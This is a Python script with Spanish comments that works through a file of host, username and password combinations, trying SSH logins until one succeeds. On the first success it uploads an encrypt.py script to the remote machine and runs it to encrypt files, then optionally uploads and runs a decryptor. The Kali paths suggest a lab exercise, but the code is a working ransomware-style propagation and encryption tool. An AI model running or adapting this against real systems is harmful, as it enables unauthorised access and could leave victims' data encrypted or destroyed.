import paramiko
import socket
import time
import os
import subprocess
from cryptography.fernet import Fernet

def generate_key():
    key = Fernet.generate_key()
    key_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'key.key')
    with open(key_path, 'wb') as key_file:
        key_file.write(key)
    print(f"Clave generada y guardada en: {key_path}")
    return key_path

def ssh_connect_from_file(file_path, timeout=7):
    # Generar la clave antes de intentar la conexión
    key_path = generate_key()

    # Verificar que la clave se haya generado correctamente
    if not os.path.exists(key_path):
        print(f"Error: No se pudo generar la clave en {key_path}")
        return

    # Leer el archivo .txt
    with open(file_path, 'r') as file:
        lines = file.readlines()
    
    # Crear el cliente SSH
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for line in lines:
        # Extraer las credenciales de cada línea
        hostname, username, password = line.strip().split(',')
        
        try:
            # Intentar la conexión SSH
            print(f"Intentando conectar a {hostname} como {username}...")
            
            # Usar el timeout en segundos para la conexión
            client.connect(hostname, username=username, password=password, timeout=timeout)
            print("Conexión SSH exitosa!")
            
            # Puedes ejecutar comandos aquí si lo deseas
            stdin, stdout, stderr = client.exec_command('uname -a')
            print(stdout.read().decode())
            
            # Crear archivo en el escritorio remoto
            command = 'echo "Código proporcionado por Diego Rojas y Ejecutado por Alex" > ~/Desktop/ejecucion.txt'
            client.exec_command(command)
            print("Archivo creado en el escritorio remoto.")
            
            # Transferir el script encrypt.py a la máquina remota
            sftp = client.open_sftp()
            sftp.put('encrypt.py', '/tmp/encrypt.py')
            sftp.close()
            print("Script de encriptación transferido.")
            
            # Verificar que la clave se transfirió correctamente
            stdin, stdout, stderr = client.exec_command('cat /tmp/key.key')
            print("Contenido de la clave transferida:")
            print(stdout.read().decode())
            
            # Ejecutar el script encrypt.py en la máquina remota
            print("Ejecutando script de encriptación...")
            stdin, stdout, stderr = client.exec_command('python3 /tmp/encrypt.py')
            print(stdout.read().decode())
            print(stderr.read().decode())
            print("Script de encriptación ejecutado.")
            
            # Verificar contenido de un archivo encriptado
            print("Verificando contenido de un archivo encriptado:")
            stdin, stdout, stderr = client.exec_command('cat /home/kali/Desktop/prueba/ejecucion.txt')
            print(stdout.read().decode())

            # Solicitar autorización para ejecutar decrypt.py
            autorizacion = input("¿Desea ejecutar el script de desencriptación? (S/N): ").strip().lower()
            if autorizacion == 's':
                # Transferir el script decrypt.py a la máquina remota
                sftp = client.open_sftp()
                sftp.put('decrypt.py', '/tmp/decrypt.py')
                sftp.close()
                print("Script de desencriptación transferido.")
                
                # Ejecutar el script decrypt.py en la máquina remota
                print("Ejecutando script de desencriptación...")
                stdin, stdout, stderr = client.exec_command('python3 /tmp/decrypt.py')
                print(stdout.read().decode())
                print(stderr.read().decode())
                print("Script de desencriptación ejecutado.")
                
                # Verificar contenido del archivo desencriptado
                print("Verificando contenido del archivo desencriptado:")
                stdin, stdout, stderr = client.exec_command('cat /home/kali/Desktop/prueba/ejecucion.txt')
                print(stdout.read().decode())
            else:
                print("Desencriptación cancelada.")
            
            # Cerrar la conexión si es exitosa
            client.close()
            break  # Detenerse si se establece una conexión exitosa
        
        except (paramiko.AuthenticationException, paramiko.SSHException, socket.timeout) as e:
            print(f"Error al intentar conectar a {hostname}: {e}")
            # Si hay un error, intentar con la siguiente combinación
            time.sleep(1)  # Pausa opcional para evitar demasiados intentos rápidos
        
        finally:
            # Asegurarse de cerrar la conexión si fue abierta
            client.close()

# Llama a la función con la ruta del archivo .txt
ssh_connect_from_file('credenciales.txt')
